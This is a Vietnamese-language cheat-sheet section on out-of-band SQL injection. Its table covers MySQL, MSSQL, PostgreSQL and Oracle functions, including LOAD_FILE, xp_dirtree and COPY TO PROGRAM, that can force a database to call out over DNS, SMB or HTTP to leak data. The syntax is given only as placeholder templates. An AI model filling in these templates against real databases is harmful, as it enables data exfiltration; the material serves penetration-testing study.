## Out-of-Band

>**Cơ chế tổng quát** của OOB SQLi: thay vì dữ liệu xuất hiện trong HTTP response, DB/server sẽ bị ép tạo kết nối ra ngoài qua SMB / DNS / HTTP.

| DBMS | Hàm / kỹ thuật | Syntax khung | Giải thích |
|---|---|---|---|
| MySQL | `INTO OUTFILE` / `INTO DUMPFILE` | `SELECT <data> INTO OUTFILE '<network_path>'` | Ghi dữ liệu ra một đường dẫn mạng. Nếu DB server cố truy cập hoặc ghi tới tài nguyên mạng, có thể tạo callback SMB/UNC. |
| MySQL | `LOAD_FILE()` | `SELECT LOAD_FILE(CONCAT('<network_prefix>', <data>, '<network_suffix>'))` | Ép DB truy cập một đường dẫn mạng có chứa dữ liệu trong hostname hoặc path, từ đó tạo truy vấn DNS/SMB ra ngoài. |
| MySQL | `LOAD DATA INFILE` | `LOAD DATA INFILE '<network_path>' INTO TABLE <table_name>` | Ép DB đọc dữ liệu từ một đường dẫn mạng, làm phát sinh yêu cầu truy cập ra ngoài. |
| MSSQL | File-reading functions | `<function_name>('<network_path_with_data>', ...)` | Một số hàm đọc trace/audit/file có thể bị lạm dụng để buộc SQL Server truy cập UNC path chứa dữ liệu cần exfil. |
| MSSQL | `xp_dirtree` / `xp_fileexist` | `EXEC <procedure_name> '<network_path>'` | Các extended stored procedure này có thể khiến SQL Server truy cập SMB share từ xa. |
| MSSQL | `BACKUP` / `RESTORE` | `<backup_or_restore_statement> '<network_path>'` | Các lệnh backup/restore có thể làm SQL Server đọc/ghi qua UNC path, từ đó sinh callback mạng. |
| PostgreSQL | `COPY ... TO PROGRAM` | `COPY (<query>) TO PROGRAM '<os_command>'` | Nếu có quyền phù hợp, PostgreSQL có thể gọi chương trình ngoài. Kỹ thuật này thường bị lạm dụng để gọi công cụ mạng như DNS lookup nhằm đẩy dữ liệu ra ngoài. |
| PostgreSQL | `EXECUTE` động trong PL/pgSQL | `EXECUTE <dynamic_statement>` | Dùng để dựng câu lệnh động chứa dữ liệu cần exfil rồi chuyển cho `COPY ... TO PROGRAM` hoặc primitive khác. |
| Oracle | XML / XXE-based primitive | `SELECT <xml_function>(<xml_payload_with_external_entity>) FROM dual` | Lợi dụng XML parser / external entity để ép Oracle gửi request HTTP hoặc DNS tới server ngoài, trong đó hostname/URL có chứa dữ liệu. |

